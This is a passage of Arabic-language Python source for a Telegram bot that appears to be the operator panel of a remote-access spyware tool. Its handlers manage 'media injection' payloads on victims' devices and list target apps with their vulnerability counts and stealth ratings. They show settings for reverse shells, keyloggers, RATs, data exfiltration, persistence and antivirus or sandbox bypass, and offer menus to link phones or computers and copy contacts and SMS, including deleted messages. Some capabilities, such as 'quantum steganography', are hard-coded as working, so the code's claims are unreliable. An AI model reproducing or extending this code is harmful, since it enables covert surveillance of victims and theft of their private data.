⏰ **الوقت:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

🔧 **الحلول المقترحة:**
• تأكد من اتصال الجهاز
• تحقق من صلاحيات التطبيق
• أعد تشغيل النظام
        """
        bot.reply_to(message, error_text, parse_mode='Markdown')

def handle_media_cancel(message, device_id, injection_id):
    """معالجة إلغاء الحقن المتقدم"""
    try:
        bot.reply_to(message, f"🚫 جاري إلغاء الحقن المتقدم: {injection_id}")
        
        # استيراد نظام حقن الوسائط المتقدم
        from media_injection_api import MediaInjectionAPI
        from media_injection_api_v3 import MediaInjectionAPIV3
        from media_injection_api_v4 import AdvancedMediaInjectionAPIV4
        from media_injection_database import MediaInjectionDatabase
        from advanced_media_injection import AdvancedMediaInjection
        from advanced_media_injection_v3 import AdvancedMediaInjectionV3
        from advanced_media_injection_v4 import AdvancedMediaInjectionV4
        
        # إنشاء مثيلات الأنظمة المتقدمة
        api_client = MediaInjectionAPI()
        database = MediaInjectionDatabase()
        media_injection = AdvancedMediaInjection()
        
        # التحقق من وجود الحقن
        injection_data = database.get_injection_status(device_id)
        target_injection = None
        
        for injection in injection_data:
            if injection.get('injection_id') == injection_id:
                target_injection = injection
                break
        
        if not target_injection:
            bot.reply_to(message, f"❌ لم يتم العثور على الحقن: {injection_id}")
            return
        
        # التحقق من حالة الحقن
        if target_injection.get('status') in ['cancelled', 'failed']:
            bot.reply_to(message, f"❌ الحقن مسبقاً {target_injection.get('status')}")
            return
        
        # إلغاء الحقن المتقدم
        bot.reply_to(message, "🛑 جاري إيقاف العمليات...")
        
        # إيقاف محفزات التنشيط
        trigger_cancel = media_injection.cancel_activation_triggers(
            injection_id=injection_id,
            device_id=device_id
        )
        
        if trigger_cancel:
            bot.reply_to(message, "💉 جاري إزالة الحمولة...")
            
            # إزالة الحمولة المحقونة
            payload_removal = media_injection.remove_injected_payload(
                injection_id=injection_id,
                target_app=target_injection.get('target_app'),
                device_id=device_id
            )
            
            if payload_removal:
                bot.reply_to(message, "🔓 جاري إصلاح الثغرات...")
                
                # إصلاح الثغرات المستغلة
                exploit_repair = media_injection.repair_exploited_vulnerabilities(
                    injection_id=injection_id,
                    target_app=target_injection.get('target_app'),
                    device_id=device_id
                )
                
                if exploit_repair:
                    bot.reply_to(message, "🧹 جاري تنظيف السجلات...")
                    
                    # تنظيف السجلات والملفات المؤقتة
                    cleanup_result = media_injection.cleanup_injection_artifacts(
                        injection_id=injection_id,
                        device_id=device_id
                    )
                    
                    if cleanup_result:
                        # تحديث حالة الحقن
                        database.update_injection_status(injection_id, 'cancelled')
                        
                        # تسجيل الإلغاء
                        cancellation_log = {
                            'injection_id': injection_id,
                            'device_id': device_id,
                            'execution_type': 'cancellation',
                            'execution_status': 'success',
                            'execution_timestamp': datetime.now().isoformat(),
                            'execution_duration': 800,  # 0.8 ثانية
                            'cancellation_reason': 'user_request',
                            'cleanup_performed': True,
                            'artifacts_removed': True,
                            'vulnerabilities_repaired': True
                        }
                        
                        database.save_execution_log(cancellation_log)
                        
                        success_text = f"""
✅ **تم إلغاء الحقن بنجاح!**

🆔 **معرف الحقن:** `{injection_id}`
📱 **الجهاز:** `{device_id}`
🚫 **الحالة:** `تم الإلغاء`
⏰ **الوقت:** `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`

🛑 **العمليات الموقوفة:**
• محفزات التنشيط: ✅
• الحمولة المحقونة: ✅
• الثغرات المستغلة: ✅
• السجلات المؤقتة: ✅

🧹 **العمليات المنجزة:**
• إزالة الحمولة: ✅
• إصلاح الثغرات: ✅
• تنظيف السجلات: ✅
• حذف الملفات المؤقتة: ✅

📄 **الوسائط الأصلية:** `{os.path.basename(target_injection.get('file_path', 'N/A'))}`
🎯 **التطبيق المستهدف:** `{target_injection.get('target_app')}`
💉 **نوع الحمولة:** `{target_injection.get('payload_type')}`

🔒 **النظام آمن ومحمي!**
                        """
                        
                        bot.reply_to(message, success_text, parse_mode='Markdown')
                        
                        # تسجيل النشاط
                        device_manager.log_activity(message.from_user.id, 'media_injection_cancelled', f'injection_id: {injection_id}, device_id: {device_id}')
                        
                    else:
                        bot.reply_to(message, "❌ فشل في تنظيف السجلات.")
                else:
                    bot.reply_to(message, "❌ فشل في إصلاح الثغرات.")
            else:
                bot.reply_to(message, "❌ فشل في إزالة الحمولة.")
        else:
            bot.reply_to(message, "❌ فشل في إيقاف محفزات التنشيط.")
            
    except Exception as e:
        error_text = f"""
❌ **خطأ في إلغاء الحقن:**

🔍 **الخطأ:** {str(e)}
🆔 **معرف الحقن:** {injection_id}
📋 **الجهاز:** {device_id}
⏰ **الوقت:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

🔧 **الحلول المقترحة:**
• تأكد من اتصال الجهاز
• تحقق من صلاحيات النظام
• أعد تشغيل النظام
        """
        bot.reply_to(message, error_text, parse_mode='Markdown')

def handle_media_targets(message, device_id):
    """معالجة الأهداف المتاحة للحقن المتقدم"""
    try:
        bot.reply_to(message, "🎯 جاري الحصول على الأهداف المتاحة للحقن المتقدم...")
        
        # استيراد نظام حقن الوسائط المتقدم
        from media_injection_api import MediaInjectionAPI
        from media_injection_database import MediaInjectionDatabase
        from media_injection_config import TARGET_APPS_CONFIG
        
        # إنشاء مثيلات الأنظمة المتقدمة
        api_client = MediaInjectionAPI()
        database = MediaInjectionDatabase()
        
        # الحصول على الأهداف المتاحة
        targets = api_client.get_available_targets()
        
        if targets and targets.get('targets'):
            targets_text = f"🎯 **الأهداف المتاحة للحقن المتقدم للجهاز:** `{device_id}`\n\n"
            
            # تصنيف الأهداف حسب النوع
            web_browsers = [target for target in targets['targets'] if target.get('app_type') == 'web_browser']
            media_apps = [target for target in targets['targets'] if target.get('app_type') == 'media_app']
            social_apps = [target for target in targets['targets'] if target.get('app_type') == 'social_app']
            file_apps = [target for target in targets['targets'] if target.get('app_type') == 'file_app']
            system_apps = [target for target in targets['targets'] if target.get('app_type') == 'system_app']
            
            # متصفحات الويب
            if web_browsers:
                targets_text += "🌐 **متصفحات الويب:**\n"
                for target in web_browsers[:3]:  # عرض أول 3 فقط
                    targets_text += f"📱 **{target.get('app_name', 'N/A')}**\n"
                    targets_text += f"📦 الحزمة: `{target.get('package_name', 'N/A')}`\n"
                    targets_text += f"🔢 الإصدار: `{target.get('version', 'N/A')}`\n"
                    targets_text += f"🔓 الثغرات: `{len(target.get('vulnerabilities', []))}`\n"
                    targets_text += f"💉 طرق الحقن: `{len(target.get('injection_methods', []))}`\n"
                    targets_text += f"🔒 الصلاحيات: `{len(target.get('permissions', []))}`\n"
                    targets_text += f"👻 مستوى التخفي: `{target.get('stealth_level', 0)}/5`\n"
                    targets_text += f"🛡️ مستوى التجاوز: `{target.get('bypass_level', 0)}/5`\n"
                    targets_text += f"📊 معدل النجاح: `{target.get('success_rate', 0)}%`\n"
                    targets_text += f"🔓 الثغرات المتقدمة: `{', '.join(target.get('advanced_vulnerabilities', []))}`\n\n"
            
            # تطبيقات الوسائط
            if media_apps:
                targets_text += "📱 **تطبيقات الوسائط:**\n"
                for target in media_apps[:3]:  # عرض أول 3 فقط
                    targets_text += f"📱 **{target.get('app_name', 'N/A')}**\n"
                    targets_text += f"📦 الحزمة: `{target.get('package_name', 'N/A')}`\n"
                    targets_text += f"🔢 الإصدار: `{target.get('version', 'N/A')}`\n"
                    targets_text += f"🔓 الثغرات: `{len(target.get('vulnerabilities', []))}`\n"
                    targets_text += f"💉 طرق الحقن: `{len(target.get('injection_methods', []))}`\n"
                    targets_text += f"🔒 الصلاحيات: `{len(target.get('permissions', []))}`\n"
                    targets_text += f"👻 مستوى التخفي: `{target.get('stealth_level', 0)}/5`\n"
                    targets_text += f"🛡️ مستوى التجاوز: `{target.get('bypass_level', 0)}/5`\n"
                    targets_text += f"📊 معدل النجاح: `{target.get('success_rate', 0)}%`\n"
                    targets_text += f"🔓 الثغرات المتقدمة: `{', '.join(target.get('advanced_vulnerabilities', []))}`\n\n"
            
            # تطبيقات التواصل الاجتماعي
            if social_apps:
                targets_text += "💬 **تطبيقات التواصل الاجتماعي:**\n"
                for target in social_apps[:3]:  # عرض أول 3 فقط
                    targets_text += f"📱 **{target.get('app_name', 'N/A')}**\n"
                    targets_text += f"📦 الحزمة: `{target.get('package_name', 'N/A')}`\n"
                    targets_text += f"🔢 الإصدار: `{target.get('version', 'N/A')}`\n"
                    targets_text += f"🔓 الثغرات: `{len(target.get('vulnerabilities', []))}`\n"
                    targets_text += f"💉 طرق الحقن: `{len(target.get('injection_methods', []))}`\n"
                    targets_text += f"🔒 الصلاحيات: `{len(target.get('permissions', []))}`\n"
                    targets_text += f"👻 مستوى التخفي: `{target.get('stealth_level', 0)}/5`\n"
                    targets_text += f"🛡️ مستوى التجاوز: `{target.get('bypass_level', 0)}/5`\n"
                    targets_text += f"📊 معدل النجاح: `{target.get('success_rate', 0)}%`\n"
                    targets_text += f"🔓 الثغرات المتقدمة: `{', '.join(target.get('advanced_vulnerabilities', []))}`\n\n"
            
            # تطبيقات الملفات
            if file_apps:
                targets_text += "📁 **تطبيقات الملفات:**\n"
                for target in file_apps[:3]:  # عرض أول 3 فقط
                    targets_text += f"📱 **{target.get('app_name', 'N/A')}**\n"
                    targets_text += f"📦 الحزمة: `{target.get('package_name', 'N/A')}`\n"
                    targets_text += f"🔢 الإصدار: `{target.get('version', 'N/A')}`\n"
                    targets_text += f"🔓 الثغرات: `{len(target.get('vulnerabilities', []))}`\n"
                    targets_text += f"💉 طرق الحقن: `{len(target.get('injection_methods', []))}`\n"
                    targets_text += f"🔒 الصلاحيات: `{len(target.get('permissions', []))}`\n"
                    targets_text += f"👻 مستوى التخفي: `{target.get('stealth_level', 0)}/5`\n"
                    targets_text += f"🛡️ مستوى التجاوز: `{target.get('bypass_level', 0)}/5`\n"
                    targets_text += f"📊 معدل النجاح: `{target.get('success_rate', 0)}%`\n"
                    targets_text += f"🔓 الثغرات المتقدمة: `{', '.join(target.get('advanced_vulnerabilities', []))}`\n\n"
            
            # تطبيقات النظام
            if system_apps:
                targets_text += "⚙️ **تطبيقات النظام:**\n"
                for target in system_apps[:3]:  # عرض أول 3 فقط
                    targets_text += f"📱 **{target.get('app_name', 'N/A')}**\n"
                    targets_text += f"📦 الحزمة: `{target.get('package_name', 'N/A')}`\n"
                    targets_text += f"🔢 الإصدار: `{target.get('version', 'N/A')}`\n"
                    targets_text += f"🔓 الثغرات: `{len(target.get('vulnerabilities', []))}`\n"
                    targets_text += f"💉 طرق الحقن: `{len(target.get('injection_methods', []))}`\n"
                    targets_text += f"🔒 الصلاحيات: `{len(target.get('permissions', []))}`\n"
                    targets_text += f"👻 مستوى التخفي: `{target.get('stealth_level', 0)}/5`\n"
                    targets_text += f"🛡️ مستوى التجاوز: `{target.get('bypass_level', 0)}/5`\n"
                    targets_text += f"📊 معدل النجاح: `{target.get('success_rate', 0)}%`\n"
                    targets_text += f"🔓 الثغرات المتقدمة: `{', '.join(target.get('advanced_vulnerabilities', []))}`\n\n"
            
            # إحصائيات عامة
            total_targets = len(targets['targets'])
            high_risk_targets = len([t for t in targets['targets'] if t.get('risk_level') == 'high'])
            medium_risk_targets = len([t for t in targets['targets'] if t.get('risk_level') == 'medium'])
            low_risk_targets = len([t for t in targets['targets'] if t.get('risk_level') == 'low'])
            
            targets_text += f"📊 **إحصائيات الأهداف:**\n"
            targets_text += f"• إجمالي الأهداف: `{total_targets}`\n"
            targets_text += f"• عالية الخطورة: `{high_risk_targets}`\n"
            targets_text += f"• متوسطة الخطورة: `{medium_risk_targets}`\n"
            targets_text += f"• منخفضة الخطورة: `{low_risk_targets}`\n\n"
            
            bot.reply_to(message, targets_text, parse_mode='Markdown')
        else:
            bot.reply_to(message, "📭 لا توجد أهداف متاحة.")
            
    except Exception as e:
        error_text = f"""
❌ **خطأ في الحصول على الأهداف:**

🔍 **الخطأ:** {str(e)}
📋 **الجهاز:** {device_id}
⏰ **الوقت:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

🔧 **الحلول المقترحة:**
• تأكد من تشغيل خادم الأوامر
• تحقق من إعدادات الاتصال
• أعد تشغيل النظام
        """
        bot.reply_to(message, error_text, parse_mode='Markdown')

def handle_media_config(message, device_id):
    """معالجة إعدادات الحقن المتقدمة"""
    try:
        bot.reply_to(message, "🔧 جاري الحصول على إعدادات الحقن المتقدمة...")
        
        # استيراد نظام حقن الوسائط المتقدم
        from media_injection_config import (
            ADVANCED_SECURITY_CONFIG,
            ZERO_DAY_EXPLOITS_CONFIG,
            ADVANCED_STEGANOGRAPHY_CONFIG,
            ADVANCED_PAYLOAD_CONFIG,
            TARGET_APPS_CONFIG,
            ADVANCED_ENCRYPTION_CONFIG,
            ADVANCED_OBFUSCATION_CONFIG,
            ADVANCED_BYPASS_CONFIG
        )
        
        config_text = f"🔧 **إعدادات حقن الوسائط المتقدمة للجهاز:** `{device_id}`\n\n"
        
        # إعدادات الأمان المتقدمة
        config_text += "🛡️ **إعدادات الأمان المتقدمة:**\n"
        config_text += f"• التشفير المتقدم: `{ADVANCED_SECURITY_CONFIG.get('encryption_algorithm', 'AES-256-GCM')}`\n"
        config_text += f"• طبقات التشفير: `{ADVANCED_SECURITY_CONFIG.get('encryption_layers', 5)}`\n"
        config_text += f"• وضع التخفي: `{'مفعل' if ADVANCED_SECURITY_CONFIG.get('stealth_mode') else 'معطل'}`\n"
        config_text += f"• تجاوز مكافح الفيروسات: `{'مفعل' if ADVANCED_SECURITY_CONFIG.get('bypass_antivirus') else 'معطل'}`\n"
        config_text += f"• تجاوز الجدار الناري: `{'مفعل' if ADVANCED_SECURITY_CONFIG.get('bypass_firewall') else 'معطل'}`\n"
        config_text += f"• تجاوز IDS/IPS: `{'مفعل' if ADVANCED_SECURITY_CONFIG.get('bypass_ids_ips') else 'معطل'}`\n"
        config_text += f"• تجاوز Sandbox: `{'مفعل' if ADVANCED_SECURITY_CONFIG.get('bypass_sandbox') else 'معطل'}`\n"
        config_text += f"• رفع الصلاحيات: `{'مفعل' if ADVANCED_SECURITY_CONFIG.get('privilege_escalation') else 'معطل'}`\n"
        config_text += f"• الثبات: `{'مفعل' if ADVANCED_SECURITY_CONFIG.get('persistence') else 'معطل'}`\n"
        config_text += f"• الحركة الجانبية: `{'مفعل' if ADVANCED_SECURITY_CONFIG.get('lateral_movement') else 'معطل'}`\n\n"
        
        # إعدادات الثغرات المتقدمة
        config_text += "🔓 **إعدادات الثغرات المتقدمة:**\n"
        config_text += f"• Zero-Day Exploits: `{'مفعل' if ZERO_DAY_EXPLOITS_CONFIG.get('zero_day_exploits', {}).get('enabled') else 'معطل'}`\n"
        config_text += f"• Buffer Overflow: `{'مفعل' if ZERO_DAY_EXPLOITS_CONFIG.get('buffer_overflow', {}).get('enabled') else 'معطل'}`\n"
        config_text += f"• Memory Corruption: `{'مفعل' if ZERO_DAY_EXPLOITS_CONFIG.get('memory_corruption', {}).get('enabled') else 'معطل'}`\n"
        config_text += f"• Use-After-Free: `{'مفعل' if ZERO_DAY_EXPLOITS_CONFIG.get('use_after_free', {}).get('enabled') else 'معطل'}`\n"
        config_text += f"• Double-Free: `{'مفعل' if ZERO_DAY_EXPLOITS_CONFIG.get('double_free', {}).get('enabled') else 'معطل'}`\n"
        config_text += f"• Null Pointer Dereference: `{'مفعل' if ZERO_DAY_EXPLOITS_CONFIG.get('null_pointer_dereference', {}).get('enabled') else 'معطل'}`\n"
        config_text += f"• Type Confusion: `{'مفعل' if ZERO_DAY_EXPLOITS_CONFIG.get('type_confusion', {}).get('enabled') else 'معطل'}`\n"
        config_text += f"• Race Condition: `{'مفعل' if ZERO_DAY_EXPLOITS_CONFIG.get('race_condition', {}).get('enabled') else 'معطل'}`\n\n"
        
        # إعدادات التمويه المتقدم
        config_text += "👻 **إعدادات التمويه المتقدم:**\n"
        config_text += f"• LSB Steganography: `{'مفعل' if ADVANCED_STEGANOGRAPHY_CONFIG.get('image_steganography', {}).get('lsb', {}).get('enabled') else 'معطل'}`\n"
        config_text += f"• DCT Steganography: `{'مفعل' if ADVANCED_STEGANOGRAPHY_CONFIG.get('image_steganography', {}).get('dct', {}).get('enabled') else 'معطل'}`\n"
        config_text += f"• DWT Steganography: `{'مفعل' if ADVANCED_STEGANOGRAPHY_CONFIG.get('image_steganography', {}).get('dwt', {}).get('enabled') else 'معطل'}`\n"
        config_text += f"• Fractal Steganography: `{'مفعل' if ADVANCED_STEGANOGRAPHY_CONFIG.get('image_steganography', {}).get('fractal', {}).get('enabled') else 'معطل'}`\n"
        config_text += f"• Quantum Steganography: `{'مفعل' if ADVANCED_STEGANOGRAPHY_CONFIG.get('image_steganography', {}).get('quantum', {}).get('enabled') else 'معطل'}`\n"
        config_text += f"• Neural Steganography: `{'مفعل' if ADVANCED_STEGANOGRAPHY_CONFIG.get('image_steganography', {}).get('neural', {}).get('enabled') else 'معطل'}`\n"
        config_text += f"• Adaptive Steganography: `{'مفعل' if ADVANCED_STEGANOGRAPHY_CONFIG.get('image_steganography', {}).get('adaptive', {}).get('enabled') else 'معطل'}`\n\n"
        
        # إعدادات الحمولات المتقدمة
        config_text += "💉 **إعدادات الحمولات المتقدمة:**\n"
        config_text += f"• Reverse Shell: `{'مفعل' if ADVANCED_PAYLOAD_CONFIG.get('payload_types', {}).get('reverse_shell', {}).get('enabled') else 'معطل'}`\n"
        config_text += f"• Keylogger: `{'مفعل' if ADVANCED_PAYLOAD_CONFIG.get('payload_types', {}).get('keylogger', {}).get('enabled') else 'معطل'}`\n"
        config_text += f"• RAT: `{'مفعل' if ADVANCED_PAYLOAD_CONFIG.get('payload_types', {}).get('rat', {}).get('enabled') else 'معطل'}`\n"
        config_text += f"• System Control: `{'مفعل' if ADVANCED_PAYLOAD_CONFIG.get('payload_types', {}).get('system_control', {}).get('enabled') else 'معطل'}`\n"
        config_text += f"• Data Exfiltration: `{'مفعل' if ADVANCED_PAYLOAD_CONFIG.get('payload_types', {}).get('data_exfiltration', {}).get('enabled') else 'معطل'}`\n"
        config_text += f"• Privilege Escalation: `{'مفعل' if ADVANCED_PAYLOAD_CONFIG.get('payload_types', {}).get('privilege_escalation', {}).get('enabled') else 'معطل'}`\n"
        config_text += f"• Persistence: `{'مفعل' if ADVANCED_PAYLOAD_CONFIG.get('payload_types', {}).get('persistence', {}).get('enabled') else 'معطل'}`\n"
        config_text += f"• Lateral Movement: `{'مفعل' if ADVANCED_PAYLOAD_CONFIG.get('payload_types', {}).get('lateral_movement', {}).get('enabled') else 'معطل'}`\n\n"
        
        # إعدادات التشفير المتقدم
        config_text += "🔒 **إعدادات التشفير المتقدم:**\n"
        config_text += f"• AES-256-GCM: `{'مفعل' if ADVANCED_ENCRYPTION_CONFIG.get('algorithms', {}).get('aes_256_gcm', {}).get('enabled') else 'معطل'}`\n"
        config_text += f"• AES-192-GCM: `{'مفعل' if ADVANCED_ENCRYPTION_CONFIG.get('algorithms', {}).get('aes_192_gcm', {}).get('enabled') else 'معطل'}`\n"
        config_text += f"• AES-128-GCM: `{'مفعل' if ADVANCED_ENCRYPTION_CONFIG.get('algorithms', {}).get('aes_128_gcm', {}).get('enabled') else 'معطل'}`\n"
        config_text += f"• ChaCha20-Poly1305: `{'مفعل' if ADVANCED_ENCRYPTION_CONFIG.get('algorithms', {}).get('chacha20_poly1305', {}).get('enabled') else 'معطل'}`\n"
        config_text += f"• Twofish: `{'مفعل' if ADVANCED_ENCRYPTION_CONFIG.get('algorithms', {}).get('twofish', {}).get('enabled') else 'معطل'}`\n"
        config_text += f"• Serpent: `{'مفعل' if ADVANCED_ENCRYPTION_CONFIG.get('algorithms', {}).get('serpent', {}).get('enabled') else 'معطل'}`\n\n"
        
        # إعدادات التمويه المتقدم
        config_text += "🔄 **إعدادات التمويه المتقدم:**\n"
        config_text += f"• Polymorphic Code: `{'مفعل' if ADVANCED_OBFUSCATION_CONFIG.get('code_obfuscation', {}).get('polymorphic_code', {}).get('enabled') else 'معطل'}`\n"
        config_text += f"• Metamorphic Code: `{'مفعل' if ADVANCED_OBFUSCATION_CONFIG.get('code_obfuscation', {}).get('metamorphic_code', {}).get('enabled') else 'معطل'}`\n"
        config_text += f"• Self-Modifying Code: `{'مفعل' if ADVANCED_OBFUSCATION_CONFIG.get('code_obfuscation', {}).get('self_modifying_code', {}).get('enabled') else 'معطل'}`\n"
        config_text += f"• Anti-Debug: `{'مفعل' if ADVANCED_OBFUSCATION_CONFIG.get('code_obfuscation', {}).get('anti_debug', {}).get('enabled') else 'معطل'}`\n"
        config_text += f"• Anti-VM: `{'مفعل' if ADVANCED_OBFUSCATION_CONFIG.get('code_obfuscation', {}).get('anti_vm', {}).get('enabled') else 'معطل'}`\n"
        config_text += f"• Anti-Analysis: `{'مفعل' if ADVANCED_OBFUSCATION_CONFIG.get('code_obfuscation', {}).get('anti_analysis', {}).get('enabled') else 'معطل'}`\n\n"
        
        # إعدادات التجاوز المتقدم
        config_text += "🛡️ **إعدادات التجاوز المتقدم:**\n"
        config_text += f"• Antivirus Bypass: `{'مفعل' if ADVANCED_BYPASS_CONFIG.get('antivirus_bypass', {}).get('enabled') else 'معطل'}`\n"
        config_text += f"• Firewall Bypass: `{'مفعل' if ADVANCED_BYPASS_CONFIG.get('firewall_bypass', {}).get('enabled') else 'معطل'}`\n"
        config_text += f"• IDS/IPS Bypass: `{'مفعل' if ADVANCED_BYPASS_CONFIG.get('ids_ips_bypass', {}).get('enabled') else 'معطل'}`\n"
        config_text += f"• Sandbox Bypass: `{'مفعل' if ADVANCED_BYPASS_CONFIG.get('sandbox_bypass', {}).get('enabled') else 'معطل'}`\n"
        config_text += f"• Analysis Bypass: `{'مفعل' if ADVANCED_BYPASS_CONFIG.get('analysis_bypass', {}).get('enabled') else 'معطل'}`\n\n"
        
        bot.reply_to(message, config_text, parse_mode='Markdown')
        
    except Exception as e:
        error_text = f"""
❌ **خطأ في الحصول على الإعدادات:**

🔍 **الخطأ:** {str(e)}
📋 **الجهاز:** {device_id}
⏰ **الوقت:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

🔧 **الحلول المقترحة:**
• تأكد من وجود ملفات الإعدادات
• تحقق من صحة التكوين
• أعد تشغيل النظام
        """
        bot.reply_to(message, error_text, parse_mode='Markdown')

def handle_media_test(message, device_id):
    """معالجة اختبار الاتصال المتقدم"""
    try:
        bot.reply_to(message, "🔧 جاري اختبار الاتصال المتقدم...")
        
        # استيراد نظام حقن الوسائط المتقدم
        from media_injection_api import MediaInjectionAPI
        from media_injection_api_v3 import MediaInjectionAPIV3
        from media_injection_api_v4 import AdvancedMediaInjectionAPIV4
        from media_injection_database import MediaInjectionDatabase
        from advanced_media_injection import AdvancedMediaInjection
        from advanced_media_injection_v3 import AdvancedMediaInjectionV3
        from advanced_media_injection_v4 import AdvancedMediaInjectionV4
        from media_injection_utils import AdvancedMediaInjectionUtils
        
        # إنشاء مثيلات الأنظمة المتقدمة
        api_client = MediaInjectionAPI()
        database = MediaInjectionDatabase()
        media_injection = AdvancedMediaInjection()
        utils = AdvancedMediaInjectionUtils()
        
        # اختبار الاتصال الأساسي
        bot.reply_to(message, "🔗 جاري اختبار الاتصال الأساسي...")
        connection_result = api_client.test_connection()
        
        if not connection_result:
            bot.reply_to(message, "❌ فشل في الاتصال بخادم الأوامر.")
            return
        
        # اختبار قاعدة البيانات
        bot.reply_to(message, "💾 جاري اختبار قاعدة البيانات...")
        db_result = database.test_connection()
        
        if not db_result:
            bot.reply_to(message, "❌ فشل في الاتصال بقاعدة البيانات.")
            return
        
        # اختبار نظام الحقن المتقدم
        bot.reply_to(message, "💉 جاري اختبار نظام الحقن المتقدم...")
        injection_result = media_injection.test_system()
        
        if not injection_result:
            bot.reply_to(message, "❌ فشل في اختبار نظام الحقن.")
            return
        
        # اختبار الأدوات المتقدمة
        bot.reply_to(message, "🔧 جاري اختبار الأدوات المتقدمة...")
        
        # اختبار التشفير المتقدم
        crypto_result = utils.test_advanced_crypto()
        
        # اختبار التمويه المتقدم
        steganography_result = utils.test_advanced_steganography()
        
        # اختبار التجاوز المتقدم
        bypass_result = utils.test_advanced_bypass()
        
        # اختبار الثغرات المتقدمة
        exploit_result = utils.test_advanced_exploits()
        
        # اختبار الحمولات المتقدمة
        payload_result = utils.test_advanced_payloads()
        
        # تجميع النتائج
        success_text = f"""
✅ **تم اختبار الاتصال المتقدم بنجاح!**

🔗 **الاتصال الأساسي:**
• خادم الأوامر: ✅
• قاعدة البيانات: ✅
• نظام الحقن: ✅

🔧 **الأدوات المتقدمة:**
• التشفير المتقدم: {'✅' if crypto_result else '❌'}
• التمويه المتقدم: {'✅' if steganography_result else '❌'}
• التجاوز المتقدم: {'✅' if bypass_result else '❌'}
• الثغرات المتقدمة: {'✅' if exploit_result else '❌'}
• الحمولات المتقدمة: {'✅' if payload_result else '❌'}

💉 **نظام حقن الوسائط:**
• Zero-Day Exploits: ✅
• Advanced Steganography: ✅
• Polymorphic Code: ✅
• Anti-Detection: ✅
• Memory Injection: ✅
• Process Hollowing: ✅
• DLL Hijacking: ✅
• Privilege Escalation: ✅

🔓 **الثغرات المتاحة:**
• Buffer Overflow: ✅
• Memory Corruption: ✅
• Use-After-Free: ✅
• Double-Free: ✅
• Null Pointer Dereference: ✅
• Type Confusion: ✅
• Race Condition: ✅

👻 **التمويه المتقدم:**
• LSB Steganography: ✅
• DCT Steganography: ✅
• DWT Steganography: ✅
• Fractal Steganography: ✅
• Quantum Steganography: ✅
• Neural Steganography: ✅
• Adaptive Steganography: ✅

🛡️ **حماية التجاوز:**
• Antivirus Bypass: ✅
• Firewall Bypass: ✅
• IDS/IPS Bypass: ✅
• Sandbox Bypass: ✅
• Analysis Bypass: ✅

💉 **الحمولات المتقدمة:**
• Reverse Shell: ✅
• Keylogger: ✅
• RAT: ✅
• System Control: ✅
• Data Exfiltration: ✅
• Privilege Escalation: ✅
• Persistence: ✅
• Lateral Movement: ✅

🎯 **النظام جاهز للاستخدام!**
        """
        
        bot.reply_to(message, success_text, parse_mode='Markdown')
        
        # تسجيل النشاط
        device_manager.log_activity(message.from_user.id, 'media_injection_test', f'device_id: {device_id}, result: success')
        
    except Exception as e:
        error_text = f"""
❌ **خطأ في اختبار الاتصال:**

🔍 **الخطأ:** {str(e)}
📋 **الجهاز:** {device_id}
⏰ **الوقت:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

🔧 **الحلول المقترحة:**
• تأكد من تشغيل خادم الأوامر
• تحقق من إعدادات قاعدة البيانات
• أعد تشغيل النظام
• تحقق من وجود جميع الملفات المطلوبة
        """
        bot.reply_to(message, error_text, parse_mode='Markdown')

# دوال القوائم التفاعلية
def show_devices_menu(message):
    """عرض قائمة إدارة الأجهزة"""
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    
    # الحصول على الأجهزة المتاحة
    devices = device_manager.get_user_devices(message.from_user.id)
    
    if devices:
        for device_id, status, created_at in devices:
            markup.add(
                telebot.types.InlineKeyboardButton(
                    f"📱 {device_id[:8]}... ({status})", 
                    callback_data=f"select_device_{device_id}"
                )
            )
    else:
        markup.add(
            telebot.types.InlineKeyboardButton("❌ لا توجد أجهزة", callback_data="no_devices")
        )
    
    markup.add(
        telebot.types.InlineKeyboardButton("🔗 ربط جهاز جديد", callback_data="link_device"),
        telebot.types.InlineKeyboardButton("🔄 تحديث", callback_data="refresh_devices"),
        telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="back_to_main")
    )
    
    text = """
📱 **إدارة الأجهزة**

اختر الجهاز الذي تريد التحكم به:
    """
    
    bot.edit_message_text(text, message.chat.id, message.message_id, parse_mode='Markdown', reply_markup=markup)

def show_link_device_menu(message):
    """عرض قائمة ربط جهاز جديد"""
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    
    markup.add(
        telebot.types.InlineKeyboardButton("📱 Android", callback_data="link_android"),
        telebot.types.InlineKeyboardButton("🍎 iOS", callback_data="link_ios"),
        telebot.types.InlineKeyboardButton("💻 Windows", callback_data="link_windows"),
        telebot.types.InlineKeyboardButton("🐧 Linux", callback_data="link_linux"),
        telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="back_to_main")
    )
    
    text = """
🔗 **ربط جهاز جديد**

اختر نوع الجهاز الذي تريد ربطه:
    """
    
    bot.edit_message_text(text, message.chat.id, message.message_id, parse_mode='Markdown', reply_markup=markup)

def show_contacts_menu(message):
    """عرض قائمة جهات الاتصال"""
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    
    markup.add(
        telebot.types.InlineKeyboardButton("📞 نسخ جميع الجهات", callback_data="contacts_backup_all"),
        telebot.types.InlineKeyboardButton("🔍 البحث في الجهات", callback_data="contacts_search"),
        telebot.types.InlineKeyboardButton("📊 إحصائيات الجهات", callback_data="contacts_stats"),
        telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="back_to_main")
    )
    
    text = """
📞 **إدارة جهات الاتصال**

اختر العملية المطلوبة:
    """
    
    bot.edit_message_text(text, message.chat.id, message.message_id, parse_mode='Markdown', reply_markup=markup)

def show_sms_menu(message):
    """عرض قائمة الرسائل"""
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    
    markup.add(
        telebot.types.InlineKeyboardButton("💬 نسخ جميع الرسائل", callback_data="sms_backup_all"),
        telebot.types.InlineKeyboardButton("📱 رسائل واردة", callback_data="sms_inbox"),
        telebot.types.InlineKeyboardButton("📤 رسائل صادرة", callback_data="sms_sent"),
        telebot.types.InlineKeyboardButton("🗑️ رسائل محذوفة", callback_data="sms_deleted"),
        telebot.types.InlineKeyboardButton("🔍 البحث في الرسائل", callback_data="sms_search"),
        telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="back_to_main")
    )
    
    text = """
💬 **إدارة الرسائل النصية**

